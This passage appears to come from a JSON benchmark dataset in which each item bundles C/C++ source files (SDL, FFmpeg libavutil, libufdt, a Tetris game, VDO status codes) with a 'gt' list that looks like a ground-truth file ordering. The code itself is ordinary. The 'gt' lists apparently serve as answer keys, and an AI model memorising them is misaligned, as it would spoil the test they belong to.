\"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'\n:\n\n\n\n#ifndef _SDL_atomic_h_\n#define _SDL_atomic_h_\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_platform.h\"\n\n#include \"begin_code.h\"\n\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\ntypedef int SDL_SpinLock;\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicTryLock(SDL_SpinLock *lock);\n\n\nextern DECLSPEC void SDLCALL SDL_AtomicLock(SDL_SpinLock *lock);\n\n\nextern DECLSPEC void SDLCALL SDL_AtomicUnlock(SDL_SpinLock *lock);\n\n\n#if defined(_MSC_VER) && (_MSC_VER > 1200)\nvoid _ReadWriteBarrier(void);\n#pragma intrinsic(_ReadWriteBarrier)\n#define SDL_CompilerBarrier()   _ReadWriteBarrier()\n#elif (defined(__GNUC__) && !defined(__EMSCRIPTEN__)) || (defined(__SUNPRO_C) && (__SUNPRO_C >= 0x5120))\n\n#define SDL_CompilerBarrier()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#else\n#define SDL_CompilerBarrier()   \\\n{ SDL_SpinLock _tmp = 0; SDL_AtomicLock(&_tmp); SDL_AtomicUnlock(&_tmp); }\n#endif\n\n\n#if defined(__GNUC__) && (defined(__powerpc__) || defined(__ppc__))\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"lwsync\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"lwsync\" : : : \"memory\")\n#elif defined(__GNUC__) && defined(__arm__)\n#if defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7EM__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"dmb ish\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"dmb ish\" : : : \"memory\")\n#elif defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6T2__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__)\n#ifdef __thumb__\n\nextern DECLSPEC void SDLCALL SDL_MemoryBarrierRelease();\nextern DECLSPEC void SDLCALL SDL_MemoryBarrierAcquire();\n#else\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"mcr p15, 0, %0, c7, c10, 5\" : : \"r\"(0) : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"mcr p15, 0, %0, c7, c10, 5\" : : \"r\"(0) : \"memory\")\n#endif\n#else\n#define SDL_MemoryBarrierRelease()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#define SDL_MemoryBarrierAcquire()   __asm__ __volatile__ (\"\" : : : \"memory\")\n#endif\n#else\n#if (defined(__SUNPRO_C) && (__SUNPRO_C >= 0x5120))\n\n#include <mbarrier.h>\n#define SDL_MemoryBarrierRelease()  __machine_rel_barrier()\n#define SDL_MemoryBarrierAcquire()  __machine_acq_barrier()\n#else\n\n#define SDL_MemoryBarrierRelease()  SDL_CompilerBarrier()\n#define SDL_MemoryBarrierAcquire()  SDL_CompilerBarrier()\n#endif\n#endif\n\n\ntypedef struct { int value; } SDL_atomic_t;\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicCAS(SDL_atomic_t *a, int oldval, int newval);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicSet(SDL_atomic_t *a, int v);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicGet(SDL_atomic_t *a);\n\n\nextern DECLSPEC int SDLCALL SDL_AtomicAdd(SDL_atomic_t *a, int v);\n\n\n#ifndef SDL_AtomicIncRef\n#define SDL_AtomicIncRef(a)    SDL_AtomicAdd(a, 1)\n#endif\n\n\n#ifndef SDL_AtomicDecRef\n#define SDL_AtomicDecRef(a)    (SDL_AtomicAdd(a, -1) == 1)\n#endif\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_AtomicCASPtr(void **a, void *oldval, void *newval);\n\n\nextern DECLSPEC void* SDLCALL SDL_AtomicSetPtr(void **a, void* v);\n\n\nextern DECLSPEC void* SDLCALL SDL_AtomicGetPtr(void **a);\n\n\n#ifdef __cplusplus\n}\n#endif\n\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_atomic.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/file.h'",
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/avutil.h'",
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/error.h'"
        ],
        "content": "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/file.h'\n:\n\n#ifndef AVUTIL_FILE_H\n#define AVUTIL_FILE_H\n\n#include <stdint.h>\n\n#include \"avutil.h\"\n\n\n\n\nav_warn_unused_result\nint av_file_map(const char *filename, uint8_t **bufptr, size_t *size,\n                int log_offset, void *log_ctx);\n\n\nvoid av_file_unmap(uint8_t *bufptr, size_t size);\n\n\nint av_tempfile(const char *prefix, char **filename, int log_offset, void *log_ctx);\n\n#endif\n\n'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/avutil.h'\n:\n\n#ifndef AVUTIL_AVUTIL_H\n#define AVUTIL_AVUTIL_H\n\n\n\n\n\n\n\n\n\n\n\nunsigned avutil_version(void);\n\n\nconst char *av_version_info(void);\n\n\nconst char *avutil_configuration(void);\n\n\nconst char *avutil_license(void);\n\n\n\n\n\nenum AVMediaType {\n    AVMEDIA_TYPE_UNKNOWN = -1,\n    AVMEDIA_TYPE_VIDEO,\n    AVMEDIA_TYPE_AUDIO,\n    AVMEDIA_TYPE_DATA,\n    AVMEDIA_TYPE_SUBTITLE,\n    AVMEDIA_TYPE_ATTACHMENT,\n    AVMEDIA_TYPE_NB\n};\n\n\nconst char *av_get_media_type_string(enum AVMediaType media_type);\n\n\n\n#define FF_LAMBDA_SHIFT 7\n#define FF_LAMBDA_SCALE (1<<FF_LAMBDA_SHIFT)\n#define FF_QP2LAMBDA 118\n#define FF_LAMBDA_MAX (256*128-1)\n\n#define FF_QUALITY_SCALE FF_LAMBDA_SCALE\n\n\n\n\n\n#define AV_NOPTS_VALUE          ((int64_t)UINT64_C(0x8000000000000000))\n\n\n\n#define AV_TIME_BASE            1000000\n\n\n\n#define AV_TIME_BASE_Q          (AVRational){1, AV_TIME_BASE}\n\n\n\nenum AVPictureType {\n    AV_PICTURE_TYPE_NONE = 0,\n    AV_PICTURE_TYPE_I,\n    AV_PICTURE_TYPE_P,\n    AV_PICTURE_TYPE_B,\n    AV_PICTURE_TYPE_S,\n    AV_PICTURE_TYPE_SI,\n    AV_PICTURE_TYPE_SP,\n    AV_PICTURE_TYPE_BI,\n};\n\n\nchar av_get_picture_type_char(enum AVPictureType pict_type);\n\n\n\n#include \"common.h\"\n#include \"error.h\"\n#include \"rational.h\"\n#include \"version.h\"\n#include \"macros.h\"\n#include \"mathematics.h\"\n#include \"log.h\"\n#include \"pixfmt.h\"\n\n\nstatic inline void *av_x_if_null(const void *p, const void *x)\n{\n    return (void *)(intptr_t)(p ? p : x);\n}\n\n\nunsigned av_int_list_length_for_size(unsigned elsize,\n                                     const void *list, uint64_t term) av_pure;\n\n\n#define av_int_list_length(list, term) \\\n    av_int_list_length_for_size(sizeof(*(list)), list, term)\n\n\nFILE *av_fopen_utf8(const char *path, const char *mode);\n\n\nAVRational av_get_time_base_q(void);\n\n#define AV_FOURCC_MAX_STRING_SIZE 32\n\n#define av_fourcc2str(fourcc) av_fourcc_make_string((char[AV_FOURCC_MAX_STRING_SIZE]){0}, fourcc)\n\n\nchar *av_fourcc_make_string(char *buf, uint32_t fourcc);\n\n\n\n#endif\n\n'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/error.h'\n:\n\n\n\n#ifndef AVUTIL_ERROR_H\n#define AVUTIL_ERROR_H\n\n#include <errno.h>\n#include <stddef.h>\n\n\n\n\n\n#if EDOM > 0\n#define AVERROR(e) (-(e))\n#define AVUNERROR(e) (-(e))\n#else\n\n#define AVERROR(e) (e)\n#define AVUNERROR(e) (e)\n#endif\n\n#define FFERRTAG(a, b, c, d) (-(int)MKTAG(a, b, c, d))\n\n#define AVERROR_BSF_NOT_FOUND      FFERRTAG(0xF8,'B','S','F')\n#define AVERROR_BUG                FFERRTAG( 'B','U','G','!')\n#define AVERROR_BUFFER_TOO_SMALL   FFERRTAG( 'B','U','F','S')\n#define AVERROR_DECODER_NOT_FOUND  FFERRTAG(0xF8,'D','E','C')\n#define AVERROR_DEMUXER_NOT_FOUND  FFERRTAG(0xF8,'D','E','M')\n#define AVERROR_ENCODER_NOT_FOUND  FFERRTAG(0xF8,'E','N','C')\n#define AVERROR_EOF                FFERRTAG( 'E','O','F',' ')\n#define AVERROR_EXIT               FFERRTAG( 'E','X','I','T')\n#define AVERROR_EXTERNAL           FFERRTAG( 'E','X','T',' ')\n#define AVERROR_FILTER_NOT_FOUND   FFERRTAG(0xF8,'F','I','L')\n#define AVERROR_INVALIDDATA        FFERRTAG( 'I','N','D','A')\n#define AVERROR_MUXER_NOT_FOUND    FFERRTAG(0xF8,'M','U','X')\n#define AVERROR_OPTION_NOT_FOUND   FFERRTAG(0xF8,'O','P','T')\n#define AVERROR_PATCHWELCOME       FFERRTAG( 'P','A','W','E')\n#define AVERROR_PROTOCOL_NOT_FOUND FFERRTAG(0xF8,'P','R','O')\n\n#define AVERROR_STREAM_NOT_FOUND   FFERRTAG(0xF8,'S','T','R')\n\n#define AVERROR_BUG2               FFERRTAG( 'B','U','G',' ')\n#define AVERROR_UNKNOWN            FFERRTAG( 'U','N','K','N')\n#define AVERROR_EXPERIMENTAL       (-0x2bb2afa8)\n#define AVERROR_INPUT_CHANGED      (-0x636e6701)\n#define AVERROR_OUTPUT_CHANGED     (-0x636e6702)\n\n#define AVERROR_HTTP_BAD_REQUEST   FFERRTAG(0xF8,'4','0','0')\n#define AVERROR_HTTP_UNAUTHORIZED  FFERRTAG(0xF8,'4','0','1')\n#define AVERROR_HTTP_FORBIDDEN     FFERRTAG(0xF8,'4','0','3')\n#define AVERROR_HTTP_NOT_FOUND     FFERRTAG(0xF8,'4','0','4')\n#define AVERROR_HTTP_OTHER_4XX     FFERRTAG(0xF8,'4','X','X')\n#define AVERROR_HTTP_SERVER_ERROR  FFERRTAG(0xF8,'5','X','X')\n\n#define AV_ERROR_MAX_STRING_SIZE 64\n\n\nint av_strerror(int errnum, char *errbuf, size_t errbuf_size);\n\n\nstatic inline char *av_make_error_string(char *errbuf, size_t errbuf_size, int errnum)\n{\n    av_strerror(errnum, errbuf, errbuf_size);\n    return errbuf;\n}\n\n\n#define av_err2str(errnum) \\\n    av_make_error_string((char[AV_ERROR_MAX_STRING_SIZE]){0}, AV_ERROR_MAX_STRING_SIZE, errnum)\n\n\n\n#endif\n",
        "gt": [
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/error.h'",
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/avutil.h'",
            "'VideoProcessingLibrary/vpl/src/main/cpp/ffmpeg/lib/arm64-v8a/include/libavutil/file.h'"
        ]
    },
    {
        "files": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/libufdt_sysdeps_vendor.c'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/include/libufdt_sysdeps.h'",
            "'mu_andromeda_platforms/Platforms/OpensslPkg/Library/Include/stddef.h'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/libufdt_sysdeps_vendor.c'\n:#include \"libufdt_sysdeps.h\"\n#define EFI_DTBO_ERROR -1\n#define PRE_ALLOC_BUFFER_SZ (5 * 1024 * 1024)\n\n#if INCLUDE_PLATFORM_HDRS\n#include <debug.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/types.h>\n#include <string.h>\nint dto_print(const char *fmt, ...) {\n  int err;\n\n  va_list ap;\n  va_start(ap, fmt);\n  err = _dvprintf(fmt, ap);\n  va_end(ap);\n\n  return err;\n}\n#endif\n\nint dto_print(const char *fmt, ...) {\n  return EFI_DTBO_ERROR;\n}\n\n\n\n\n\nstatic __inline char *med3(char *, char *, char *,\n                           int (*)(const void *, const void *));\nstatic __inline void swapfunc(char *, char *, int, int);\n#define min(a, b) (a) < (b) ? a : b\n\n\n#define swapcode(TYPE, parmi, parmj, n) \\\n  {                                     \\\n    long i = (n) / sizeof(TYPE);        \\\n    TYPE *pi = (TYPE *)(parmi);         \\\n    TYPE *pj = (TYPE *)(parmj);         \\\n    do {                                \\\n      TYPE t = *pi;                     \\\n      *pi++ = *pj;                      \\\n      *pj++ = t;                        \\\n    } while (--i > 0);                  \\\n  }\n#define SWAPINIT(a, es)                                                  \\\n  swaptype = ((char *)a - (char *)0) % sizeof(long) || es % sizeof(long) \\\n                 ? 2                                                     \\\n                 : es == sizeof(long) ? 0 : 1;\n\nstatic __inline void swapfunc(char *a, char *b, int n, int swaptype) {\n  if (swaptype <= 1) swapcode(long, a, b, n) else swapcode(char, a, b, n)\n}\n\n#define swap(a, b)               \\\n  if (swaptype == 0) {           \\\n    long t = *(long *)(a);       \\\n    *(long *)(a) = *(long *)(b); \\\n    *(long *)(b) = t;            \\\n  } else                         \\\n    swapfunc(a, b, es, swaptype)\n#define vecswap(a, b, n) \\\n  if ((n) > 0) swapfunc(a, b, n, swaptype)\n\nstatic __inline char *med3(char *a, char *b, char *c,\n                           int (*cmp)(const void *, const void *)) {\n  return cmp(a, b) < 0 ? (cmp(b, c) < 0 ? b : (cmp(a, c) < 0 ? c : a))\n                       : (cmp(b, c) > 0 ? b : (cmp(a, c) < 0 ? a : c));\n}\n\nvoid qsort(void *aa, size_t n, size_t es,\n           int (*cmp)(const void *, const void *)) {\n  char *pa, *pb, *pc, *pd, *pl, *pm, *pn;\n  int d, r, swaptype, swap_cnt;\n  char *a = aa;\nloop:\n  SWAPINIT(a, es);\n  swap_cnt = 0;\n  if (n < 7) {\n    for (pm = (char *)a + es; pm < (char *)a + n * es; pm += es)\n      for (pl = pm; pl > (char *)a && cmp(pl - es, pl) > 0; pl -= es)\n        swap(pl, pl - es);\n    return;\n  }\n  pm = (char *)a + (n / 2) * es;\n  if (n > 7) {\n    pl = (char *)a;\n    pn = (char *)a + (n - 1) * es;\n    if (n > 40) {\n      d = (n / 8) * es;\n      pl = med3(pl, pl + d, pl + 2 * d, cmp);\n      pm = med3(pm - d, pm, pm + d, cmp);\n      pn = med3(pn - 2 * d, pn - d, pn, cmp);\n    }\n    pm = med3(pl, pm, pn, cmp);\n  }\n  swap(a, pm);\n  pa = pb = (char *)a + es;\n\n  pc = pd = (char *)a + (n - 1) * es;\n  for (;;) {\n    while (pb <= pc && (r = cmp(pb, a)) <= 0) {\n      if (r == 0) {\n        swap_cnt = 1;\n        swap(pa, pb);\n        pa += es;\n      }\n      pb += es;\n    }\n    while (pb <= pc && (r = cmp(pc, a)) >= 0) {\n      if (r == 0) {\n        swap_cnt = 1;\n        swap(pc, pd);\n        pd -= es;\n      }\n      pc -= es;\n    }\n    if (pb > pc) break;\n    swap(pb, pc);\n    swap_cnt = 1;\n    pb += es;\n    pc -= es;\n  }\n  if (swap_cnt == 0) {\n    for (pm = (char *)a + es; pm < (char *)a + n * es; pm += es)\n      for (pl = pm; pl > (char *)a && cmp(pl - es, pl) > 0; pl -= es)\n        swap(pl, pl - es);\n    return;\n  }\n  pn = (char *)a + n * es;\n  r = min(pa - (char *)a, pb - pa);\n  vecswap(a, pb - r, r);\n  r = min(pd - pc, pn - pd - (int)es);\n  vecswap(pb, pn - r, r);\n  if ((r = pb - pa) > (int)es) qsort(a, r / es, es, cmp);\n  if ((r = pd - pc) > (int)es) {\n\n    a = pn - r;\n    n = r / es;\n    goto loop;\n  }\n\n}\n\n\n\nvoid dto_qsort(void *base, size_t nmemb, size_t size,\n               int (*compar)(const void *, const void *)) {\n  qsort(base, nmemb, size, compar);\n}\n\n\n\nstatic void* buffer;\n\nvoid* pre_overlay_malloc()\n{\n\tbuffer = AllocatePool(PRE_ALLOC_BUFFER_SZ);\n\tif (!buffer) {\n\t\treturn NULL;\n\t}\n\treturn buffer;\n}\n\nvoid post_overlay_free()\n{\n\tif (buffer)\n\t\tFreePool(buffer);\n}\n\nvoid *dto_malloc(size_t size) {\n\tstatic int ssize = 0;\n        void *retbuf;\n\n\tif (((MAX_UINT64 - ssize) < size) || ((ssize + size) > PRE_ALLOC_BUFFER_SZ)) {\n\t\treturn NULL;\n\t}\n\n\tretbuf = buffer + ssize;\n\tssize += size;\n\treturn retbuf;\n}\n\nvoid dto_free(void *ptr) { }\n\nchar *dto_strdup(const char *s) {\n\tchar * RetPtr = NULL;\n\tuint32_t Len = strlen(s) + 1;\n\n\tRetPtr = dto_malloc(Len);\n\tif (!RetPtr)\n\t\treturn NULL;\n\tmemset(RetPtr, 0, Len);\n\tmemcpy(RetPtr, s, strlen(s));\n\treturn RetPtr;\n}\n\nchar *dto_strchr(const char *s, int c) { return strchr(s, c); }\n\nunsigned long int dto_strtoul(const char *nptr, char **endptr, int base) {\n  return strtoul(nptr, endptr, base);\n}\n\nsize_t dto_strlen(const char *s) { return strlen(s); }\n\nvoid *dto_memcpy(void *dest, const void *src, size_t n) {\n  return memcpy(dest, src, n);\n}\n\nint dto_strcmp(const char *s1, const char *s2) { return strcmp(s1, s2); }\n\nint dto_strncmp(const char *s1, const char *s2, size_t n) {\n  return strncmp(s1, s2, n);\n}\n\nvoid *dto_memchr(const void *s, int c, size_t n) { return memchr(s, c, n); }\n\nvoid *dto_memset(void *s, int c, size_t n) { return memset(s, c, n); }\n\n'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/include/libufdt_sysdeps.h'\n:#ifndef LIBDTOVERLAY_SYSDEPS_H\n#define LIBDTOVERLAY_SYSDEPS_H\n\n#ifdef INCLUDE_PLATFORM_HDRS\n\n#include <inttypes.h>\n#include <stdbool.h>\n#include <stddef.h>\n#include <stdint.h>\n#else\n#include <libfdt_env.h>\n#endif\n\n#ifdef DTO_ENABLE_DEBUG\n\n#define dto_debug(...)                   \\\n  do {                                   \\\n    dto_print(\"DEBUG: %s():\", __func__); \\\n    dto_print(__VA_ARGS__);              \\\n  } while (0)\n#else\n#define dto_debug(...)\n#endif\n\n#define dto_error(...)                   \\\n  do {                                   \\\n    dto_print(\"ERROR: %s():\", __func__); \\\n    dto_print(__VA_ARGS__);              \\\n  } while (0)\n\nint dto_print(const char *fmt, ...);\n\nvoid dto_qsort(void *base, size_t nmemb, size_t size,\n               int (*compar)(const void *, const void *));\n\nvoid *dto_malloc(size_t size);\n\nvoid dto_free(void *ptr);\n\nchar *dto_strdup(const char *s);\n\nchar *dto_strchr(const char *s, int c);\n\nunsigned long int dto_strtoul(const char *nptr, char **endptr, int base);\n\nsize_t dto_strlen(const char *s);\n\nvoid *dto_memcpy(void *dest, const void *src, size_t n);\n\nint dto_strcmp(const char *s1, const char *s2);\n\nint dto_strncmp(const char *s1, const char *s2, size_t n);\n\nvoid *dto_memchr(const void *s, int c, size_t n);\n\nvoid *dto_memset(void *s, int c, size_t n);\n\nvoid* pre_overlay_malloc();\n\nvoid post_overlay_free();\n\n#endif\n\n'mu_andromeda_platforms/Platforms/OpensslPkg/Library/Include/stddef.h'\n:\n\n#include <CrtLibSupport.h>\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/OpensslPkg/Library/Include/stddef.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/include/libufdt_sysdeps.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/LibUfdt/sysdeps/libufdt_sysdeps_vendor.c'"
        ]
    },
    {
        "files": [
            "'tetris-sdl-c/src/utility.h'",
            "'tetris-sdl-c/src/input.h'",
            "'tetris-sdl-c/src/main.c'",
            "'tetris-sdl-c/src/tetris.h'",
            "'tetris-sdl-c/src/main.h'"
        ],
        "content": "'tetris-sdl-c/src/utility.h'\n:#include \"defs.h\"\n\nsds printfcomma(int n);\n\n'tetris-sdl-c/src/input.h'\n:#include \"defs.h\"\n#include \"tetris.h\"\n\nTetris_Action TETROMINO_ACTION;\n\nvoid getInput();\n\n'tetris-sdl-c/src/main.c'\n:#include \"main.h\"\n\nint main(int argc, const char *argv[]) {\n\n\n\n    uint32_t flags = SDL_INIT_TIMER | SDL_INIT_VIDEO | SDL_INIT_EVENTS;\n    if (SDL_Init(SDL_INIT_EVERYTHING) != 0) {\n\n        fprintf(stderr,\n                \"\\nUnable to initialize SDL:  %s\\n\",\n                SDL_GetError());\n\n        return 1;\n    }\n\n    atexit(cleanup);\n\n    init();\n\n    bool quit = false;\n    while(!quit) {\n\n        preRender();\n\n        getInput();\n\n        updateTetris();\n\n        updateRender();\n\n\n\n        SDL_Delay(16);\n    }\n\n    return 0;\n}\n\n'tetris-sdl-c/src/tetris.h'\n:#include \"defs.h\"\n#include \"utility.h\"\n#include \"shuffle.h\"\n#include \"graphics.h\"\n\n\n#ifndef _TETRIS_CONSTANTS\n#define _TETRIS_CONSTANTS\n\ntypedef struct {\n\n\n\n\n    uint16_t rotation[4];\n\n\n    uint32_t color;\n\n} Tetromino;\n\ntypedef struct {\n\n    Tetromino type;\n\n\n    uint8_t rotation;\n\n    uint8_t x;\n    uint8_t y;\n\n} Tetromino_Movement;\n\ntypedef enum {\n    NONE,\n    DOWN,\n    LEFT,\n    RIGHT,\n    DROP,\n    ROTATE,\n\n    AUTO_DROP,\n    RESTART\n} Tetris_Action;\n\ntypedef enum {\n    EMPTY = 0xFFB3C0CC,\n    TEAL = 0xFFFFDB7F,\n    BLUE = 0xFFD97400,\n    ORANGE = 0XFF1B85FF,\n    YELLOW = 0xFF00DCFF,\n    GREEN = 0xFF40CC2E,\n    PURPLE = 0xFF4B1485,\n    RED = 0xFF4B59F2\n\n} Color_Block;\n\n\n\nextern Tetris_Action TETROMINO_ACTION;\n\n\nconst static Tetromino TETRA_I = {\n    {0x0F00, 0x2222, 0x00F0, 0x4444},\n    TEAL\n};\n\nconst static Tetromino TETRA_J = {\n    {0x8E00, 0x6440, 0x0E20, 0x44C0},\n    BLUE\n};\n\nconst static Tetromino TETRA_L = {\n    {0x2E00, 0x4460, 0x0E80, 0xC440},\n    ORANGE\n};\n\nconst static Tetromino TETRA_O = {\n    {0x6600, 0x6600, 0x6600, 0x6600},\n    YELLOW\n};\n\nconst static Tetromino TETRA_S = {\n    {0x6C00, 0x4620, 0x06C0, 0x8c40},\n    GREEN\n};\n\nconst static Tetromino TETRA_T = {\n    {0x4E00, 0x4640, 0x0E40, 0x4C40},\n    PURPLE\n};\n\nconst static Tetromino TETRA_Z = {\n    {0xC600, 0x2640, 0x0C60, 0x4C80},\n    RED\n};\n\n\n\n\n\n\n\nstatic uint8_t CURRENT_TETROMINO_COORDS[8] = {0};\nstatic uint8_t GHOST_TETROMINO_COORDS[8] = {0};\n\nstatic Tetromino_Movement CURRENT_TETROMINO;\n\n\n\n\n\n\nstatic Color_Block playfield[PLAYFIELD_HEIGHT * PLAYFIELD_WIDTH];\n\n\n\n\n\n\n\nconst static uint8_t lock_delay_threshold = 2;\nstatic uint8_t lock_delay_count = 0;\n\n\n\nstatic uint8_t tetromino_queue[7 * 4];\nstatic uint8_t tetromino_queue_size = 7*4;\nstatic uint8_t current_queue_index = 0;\n\n\nstatic SDL_TimerID cb_timer = 0;\n\nstatic int score = 0;\n\n#endif\n\n\nvoid draw_playing_field();\nColor_Block get_playfield(uint8_t x, uint8_t y);\nvoid set_playfield(uint8_t x, uint8_t y, Color_Block color);\n\nvoid initTetris();\nvoid updateTetris();\nvoid lockTetromino();\n\nvoid spawn_tetromino();\nbool render_tetromino(Tetromino_Movement tetra_request, uint8_t current_coords[]);\nbool render_current_tetromino(Tetromino_Movement tetra_request);\n\n'tetris-sdl-c/src/main.h'\n:#include \"defs.h\"\n\n#include \"init.h\"\n#include \"graphics.h\"\n#include \"input.h\"\n#include \"tetris.h\"\n\n\nSDL_Window *window;\nSDL_Renderer *render;\nSDL_Texture *display;\nTTF_Font *gFont;\n\nbool render_changed;\n",
        "gt": [
            "'tetris-sdl-c/src/utility.h'",
            "'tetris-sdl-c/src/tetris.h'",
            "'tetris-sdl-c/src/input.h'",
            "'tetris-sdl-c/src/main.h'",
            "'tetris-sdl-c/src/main.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/vdo/status-codes.c'",
            "'vdo/utils/uds/time-utils.h'",
            "'vdo/utils/uds/thread-utils.h'"
        ],
        "content": "'vdo/utils/vdo/status-codes.c'\n:\n\n\n#include \"status-codes.h\"\n\n#include <errno.h>\n\n#include \"errors.h\"\n#include \"logger.h\"\n#include \"permassert.h\"\n#include \"thread-utils.h\"\n\nconst struct error_info vdo_status_list[] = {\n\t{ \"VDO_NOT_IMPLEMENTED\", \"Not implemented\" },\n\t{ \"VDO_OUT_OF_RANGE\", \"Out of range\" },\n\t{ \"VDO_REF_COUNT_INVALID\", \"Reference count would become invalid\" },\n\t{ \"VDO_NO_SPACE\", \"Out of space\" },\n\t{ \"VDO_BAD_CONFIGURATION\", \"Bad configuration option\" },\n\t{ \"VDO_COMPONENT_BUSY\", \"Prior operation still in progress\" },\n\t{ \"VDO_BAD_PAGE\", \"Corrupt or incorrect page\" },\n\t{ \"VDO_UNSUPPORTED_VERSION\", \"Unsupported component version\" },\n\t{ \"VDO_INCORRECT_COMPONENT\", \"Component id mismatch in decoder\" },\n\t{ \"VDO_PARAMETER_MISMATCH\", \"Parameters have conflicting values\" },\n\t{ \"VDO_UNKNOWN_PARTITION\", \"No partition exists with a given id\" },\n\t{ \"VDO_PARTITION_EXISTS\", \"A partition already exists with a given id\" },\n\t{ \"VDO_INCREMENT_TOO_SMALL\", \"Physical block growth of too few blocks\" },\n\t{ \"VDO_CHECKSUM_MISMATCH\", \"Incorrect checksum\" },\n\t{ \"VDO_LOCK_ERROR\", \"A lock is held incorrectly\" },\n\t{ \"VDO_READ_ONLY\", \"The device is in read-only mode\" },\n\t{ \"VDO_SHUTTING_DOWN\", \"The device is shutting down\" },\n\t{ \"VDO_CORRUPT_JOURNAL\", \"Recovery journal entries corrupted\" },\n\t{ \"VDO_TOO_MANY_SLABS\", \"Exceeds maximum number of slabs supported\" },\n\t{ \"VDO_INVALID_FRAGMENT\", \"Compressed block fragment is invalid\" },\n\t{ \"VDO_RETRY_AFTER_REBUILD\", \"Retry operation after rebuilding finishes\" },\n\t{ \"VDO_BAD_MAPPING\", \"Invalid page mapping\" },\n\t{ \"VDO_BIO_CREATION_FAILED\", \"Bio creation failed\" },\n\t{ \"VDO_BAD_MAGIC\", \"Bad magic number\" },\n\t{ \"VDO_BAD_NONCE\", \"Bad nonce\" },\n\t{ \"VDO_JOURNAL_OVERFLOW\", \"Journal sequence number overflow\" },\n\t{ \"VDO_INVALID_ADMIN_STATE\", \"Invalid operation for current state\" },\n\t{ \"VDO_UNEXPECTED_EOF\", \"Unexpected EOF on block read\" },\n\t{ \"VDO_NOT_READ_ONLY\", \"The device is not in read-only mode\" },\n};\n\nstatic atomic_t vdo_status_codes_registered = ATOMIC_INIT(0);\nstatic int status_code_registration_result;\n\nstatic void do_status_code_registration(void)\n{\n\tint result;\n\n\tBUILD_BUG_ON((VDO_STATUS_CODE_LAST - VDO_STATUS_CODE_BASE) !=\n\t\t     ARRAY_SIZE(vdo_status_list));\n\n\tresult = uds_register_error_block(\"VDO Status\", VDO_STATUS_CODE_BASE,\n\t\t\t\t\t  VDO_STATUS_CODE_BLOCK_END, vdo_status_list,\n\t\t\t\t\t  sizeof(vdo_status_list));\n\n\tif (result == UDS_DUPLICATE_NAME)\n\t\tresult = UDS_SUCCESS;\n\n\tstatus_code_registration_result = (result == UDS_SUCCESS) ? VDO_SUCCESS : result;\n}\n\n\nint vdo_register_status_codes(void)\n{\n\tvdo_perform_once(&vdo_status_codes_registered, do_status_code_registration);\n\treturn status_code_registration_result;\n}\n\n\nint vdo_status_to_errno(int error)\n{\n\tchar error_name[VDO_MAX_ERROR_NAME_SIZE];\n\tchar error_message[VDO_MAX_ERROR_MESSAGE_SIZE];\n\n\n\tif (likely(error <= 0))\n\t\treturn error;\n\tif (error < 1024)\n\t\treturn -error;\n\n\n\tswitch (error) {\n\tcase VDO_NO_SPACE:\n\t\treturn -ENOSPC;\n\tcase VDO_READ_ONLY:\n\t\treturn -EIO;\n\tdefault:\n\t\tvdo_log_info(\"%s: mapping internal status code %d (%s: %s) to EIO\",\n\t\t\t     __func__, error,\n\t\t\t     uds_string_error_name(error, error_name, sizeof(error_name)),\n\t\t\t     uds_string_error(error, error_message, 